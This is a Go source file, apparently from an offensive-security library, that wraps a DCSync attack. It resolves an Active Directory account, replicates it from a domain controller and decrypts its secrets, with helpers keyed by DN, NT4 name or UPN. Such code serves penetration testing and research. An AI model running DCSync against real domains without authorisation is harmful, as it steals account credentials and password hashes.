package msdrsr

import (
	"fmt"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e3514235-4b06-11d1-ab04-00c04fc2dcd2/4.0/structures"
	"github.com/TheManticoreProject/Manticore/windows/guid"
)

// DCSync performs a full DCSync of a single account against the connected DC: it resolves
// the account name (given in the offered DS_NAME_FORMAT) to its objectGUID with
// IDL_DRSCrackNames, replicates the object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ), and
// decrypts its secrets. It is the one-call form of ResolveToGUID + ReplicateSingleObject
// + DecryptSecrets. The Client must already be connected.
func (c *Client) DCSync(name string, formatOffered uint32) (*AccountSecrets, error) {
	g, err := c.ResolveToGUID(name, formatOffered)
	if err != nil {
		return nil, err
	}
	return c.dcsyncGUID(g, name)
}

// DCSyncByDN DCSyncs an account identified by its distinguished name (e.g.
// "CN=Administrator,CN=Users,DC=lab,DC=local"). This is the most portable form: unlike
// the NT4 "DOMAIN\\user" format it needs no NetBIOS domain name.
func (c *Client) DCSyncByDN(dn string) (*AccountSecrets, error) {
	return c.DCSync(dn, structures.DS_FQDN_1779_NAME)
}

// DCSyncByAccount DCSyncs an account identified by its NT4 name ("DOMAIN\\user").
func (c *Client) DCSyncByAccount(domainUser string) (*AccountSecrets, error) {
	return c.DCSync(domainUser, structures.DS_NT4_ACCOUNT_NAME)
}

// DCSyncByUPN DCSyncs an account identified by its user principal name ("user@domain").
func (c *Client) DCSyncByUPN(upn string) (*AccountSecrets, error) {
	return c.DCSync(upn, structures.DS_USER_PRINCIPAL_NAME)
}

// dcsyncGUID replicates and decrypts the object with the given GUID, returning the single
// account's secrets. label names the target in error messages.
func (c *Client) dcsyncGUID(g guid.GUID, label string) (*AccountSecrets, error) {
	res, err := c.ReplicateSingleObject(g)
	if err != nil {
		return nil, err
	}
	secrets, err := c.DecryptSecrets(res)
	if err != nil {
		return nil, err
	}
	if len(secrets) == 0 {
		return nil, fmt.Errorf("msdrsr: DCSync %q: object has no objectSid (not a security principal)", label)
	}
	return secrets[0], nil
}
